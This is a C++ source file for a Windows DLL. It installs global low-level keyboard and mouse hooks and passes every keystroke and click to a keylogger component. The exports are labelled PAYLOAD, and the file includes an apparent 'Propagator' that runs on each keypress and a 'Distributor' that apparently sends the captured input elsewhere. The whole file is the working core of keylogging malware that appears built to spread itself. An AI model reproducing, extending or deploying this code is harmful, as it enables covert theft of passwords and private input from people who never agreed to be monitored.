#include <string>

#include "Distributor.h"
#include "Propagator.h"

#include "Keylogger.h"

#include <Windows.h>

# define PAYLOAD __declspec(dllexport)

/* test */

HHOOK g_hKeyboardHook;
HHOOK g_hMouseHook;
HINSTANCE g_hInstance;
Propagator g_ppgt;
Keylogger g_keylogger;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION) {
		g_ppgt.update();
		
		LPKBDLLHOOKSTRUCT key = (LPKBDLLHOOKSTRUCT)(lParam);

		switch (wParam)
		{
		case WM_SYSKEYDOWN:
			g_keylogger.keyPressed(key);
			break;
		case WM_KEYDOWN:
			g_keylogger.keyPressed(key);
			break;
		case WM_SYSKEYUP:
			g_keylogger.keyReleased(key);
			break;
		case WM_KEYUP:
			g_keylogger.keyReleased(key);
			break;
		}
	}
	return (CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam));
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION) {
		LPMSLLHOOKSTRUCT mouse = (LPMSLLHOOKSTRUCT)(lParam);
		switch (wParam)
		{
		case WM_LBUTTONUP:
			g_keylogger.mouseClick(mouse);
			break;
		case WM_RBUTTONUP:
			g_keylogger.mouseClick(mouse);
			break;
		};
	}
	return (CallNextHookEx(g_hMouseHook, nCode, wParam, lParam));
}

extern "C" PAYLOAD void CreateKeyboardHook(void)
{
	g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, g_hInstance, NULL);
	g_hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, g_hInstance, NULL); // ok without LL
}

extern "C" PAYLOAD void DeleteKeyboardHook(void)
{
	UnhookWindowsHookEx(g_hKeyboardHook);
	UnhookWindowsHookEx(g_hMouseHook);
}

extern "C" PAYLOAD void SetApplicationPath(std::string const& appliPath)
{
	g_ppgt.setApplicationPath(appliPath);
}

extern "C" PAYLOAD void SetDistributor(std::shared_ptr<Distributor> ptr)
{
	g_keylogger.setDistributor(ptr);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	g_keylogger.init();
	g_ppgt.init();

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		g_hInstance = hinstDLL;
		break;
	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;
	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;
	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup.
		break;
	}

	return TRUE;
}